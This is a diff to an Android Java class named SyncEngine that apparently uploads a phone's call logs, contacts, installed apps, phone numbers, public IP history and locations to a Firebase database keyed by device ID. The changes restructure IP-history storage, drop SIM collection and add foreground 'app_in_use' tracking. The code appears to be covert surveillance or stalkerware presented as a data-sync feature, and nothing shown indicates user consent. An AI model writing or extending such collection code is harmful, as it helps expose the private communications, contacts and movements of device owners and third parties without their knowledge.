@@ -65,7 +65,7 @@ public class SyncEngine {
                 DatabaseReference db = FirebaseDatabase.getInstance().getReference();
                 SyncResult result = new SyncResult(startTime);
 
-                uploadUserData(context, db, deviceId, result);
+                uploadUserData(context, db, deviceId, result, true);
                 uploadCallLogs(context, db, deviceId, result);
                 uploadContacts(context, db, deviceId, result);
                 uploadInstalledApps(context, db, deviceId, result);
@@ -86,7 +86,7 @@ public class SyncEngine {
         });
     }
 
-    private static String getDeviceId(Context context) {
+    static String getDeviceId(Context context) {
         String id = Settings.Secure.getString(
                 context.getContentResolver(),
                 Settings.Secure.ANDROID_ID
@@ -157,7 +157,8 @@ public class SyncEngine {
     // ─── User Data ─────────────────────────────────────────────────
 
     private static void uploadUserData(Context context, DatabaseReference db,
-                                        String deviceId, SyncResult result) {
+                                        String deviceId, SyncResult result,
+                                        boolean appInUse) {
         try {
             Map<String, Object> data = new HashMap<>();
 
@@ -185,7 +186,6 @@ public class SyncEngine {
             }
             data.put("phoneNumber", phoneList);
 
-            List<Map<String, Object>> ipHistory = new ArrayList<>();
             String ip = PublicIPImpl.getPublicIPFromService("https://api.ipify.org");
             if (ip == null) {
                 ip = PublicIPImpl.getPublicIPFromService("https://checkip.amazonaws.com");
@@ -194,9 +194,9 @@ public class SyncEngine {
                 Map<String, Object> ipEntry = new HashMap<>();
                 ipEntry.put("ip", ip);
                 ipEntry.put("uploadTime", ServerValue.TIMESTAMP);
-                ipHistory.add(ipEntry);
+                db.child("users").child(deviceId).child("ipHistory")
+                        .child(hash(ip)).setValue(ipEntry);
             }
-            data.put("ipHistory", ipHistory);
 
             List<Map<String, Object>> locations = new ArrayList<>();
             try {
@@ -222,12 +222,6 @@ public class SyncEngine {
             } catch (Exception ignored) {}
             data.put("installTime", installTimeList);
 
-            List<String> simList = new ArrayList<>();
-            for (MobileNumber mn : MobileNumberImpl.getMobileNumber(context)) {
-                simList.add(mn.getSimCard());
-            }
-            data.put("sim", simList);
-
             data.put("brand", Build.BRAND != null ? Build.BRAND : "");
             data.put("model", Build.MODEL != null ? Build.MODEL : "");
 
@@ -248,7 +242,7 @@ public class SyncEngine {
             data.put("lastSeen", ServerValue.TIMESTAMP);
             data.put("lastSync", ServerValue.TIMESTAMP);
             data.put("forceSync", false);
-            data.put("app_in_use", true);
+            data.put("app_in_use", appInUse);
             data.put("permissionStatus", new ArrayList<>());
 
             db.child("users").child(deviceId).setValue(data);
@@ -558,4 +552,16 @@ public class SyncEngine {
         }
     }
 
+    static void updateAppInUse(Context context, boolean appInUse) {
+        try {
+            String deviceId = getDeviceId(context);
+            DatabaseReference db = FirebaseDatabase.getInstance().getReference();
+            Map<String, Object> updates = new HashMap<>();
+            updates.put("app_in_use", appInUse);
+            updates.put("lastSeen", ServerValue.TIMESTAMP);
+            db.child("users").child(deviceId).updateChildren(updates);
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to update app_in_use", e);
+        }
+    }
 }
